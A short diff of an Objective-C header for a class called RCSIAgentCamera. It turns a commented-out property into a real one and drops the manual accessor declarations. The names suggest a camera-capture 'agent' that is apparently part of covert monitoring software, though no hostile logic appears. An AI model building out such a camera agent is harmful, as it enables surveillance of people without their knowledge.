@@ -23,7 +23,7 @@ typedef struct _cameraStruct
   NSMutableDictionary *mAgentConfiguration;
 }
 
-//@property (retain, readwrite) NSMutableDictionary *mAgentConfiguration;
+@property (retain, readwrite) NSMutableDictionary *mAgentConfiguration;
 
 + (RCSIAgentCamera *)sharedInstance;
 
@@ -34,9 +34,6 @@ typedef struct _cameraStruct
 - (void)release;
 - (id)autorelease;
 - (id)init;
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
-- (NSMutableDictionary *)mAgentConfiguration;
 
 - (void)start;
 - (BOOL)stop;
